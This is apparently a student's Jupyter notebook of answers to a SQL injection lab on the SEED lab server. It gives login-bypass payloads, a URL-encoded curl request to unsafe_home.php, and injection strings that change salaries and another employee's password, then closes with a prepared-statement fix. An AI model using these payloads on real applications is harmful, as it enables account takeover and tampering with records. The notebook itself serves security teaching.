{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "docksh mysql-10.9.0.6\n",
    "\n",
    "    mysql -u root -pdees\n",
    "\n",
    "        mysql> Select * from credential where Name = \"Alice\";"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Tasl 2.1"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {
    "vscode": {
     "languageId": "sql"
    }
   },
   "source": [
    "Username: Admin'; #\n",
    "\n",
    "      Or: Admin'; -- (! with space at the end)\n",
    "\n",
    "Password not required"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Tasl 2.1"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {
    "vscode": {
     "languageId": "raw"
    }
   },
   "source": [
    "ASCII Encoding: https://www.w3schools.com/tags/ref_urlencode.ASP"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "shellscript"
    }
   },
   "outputs": [],
   "source": [
    "curl 'www.seed-server.com/unsafe_home.php?username=Admin%27%20%23'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Tasl 3.1"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {
    "vscode": {
     "languageId": "raw"
    }
   },
   "source": [
    "In some field of form: ', Salary = '9999"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Tasl 3.2"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {
    "vscode": {
     "languageId": "raw"
    }
   },
   "source": [
    "In some field of form: ', salary = '1' where name='Boby' #"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### TasK 3.3"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {
    "vscode": {
     "languageId": "raw"
    }
   },
   "source": [
    "Phone Number: ' where Name='Boby' #\n",
    "Password: [new psw]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Task 4"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "$stmt = $conn->prepare(\"SELECT id, name, eid, salary, ssn\n",
    "                        FROM credential\n",
    "                        WHERE name= ? and Password= ? \");\n",
    "// Bind parameters to the query\n",
    "$stmt->bind_param(\"ss\", $input_uname, $hashed_pwd);\n",
    "$stmt->execute();\n",
    "$stmt->bind_result($bund_id, $bund_name, $bund_eid, $bund_salary, $bund_ssn);\n",
    "\n",
    "if ($stmt->fetch()) {\n",
    "  // only take the first row \n",
    "  // $firstrow = $result->fetch_assoc();\n",
    "  $id     = $bund_id;\n",
    "  $name   = $bund_name;\n",
    "  $eid    = $bund_eid;\n",
    "  $salary = $bund_salary;\n",
    "  $ssn    = $bund_ssn;\n",
    "}"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
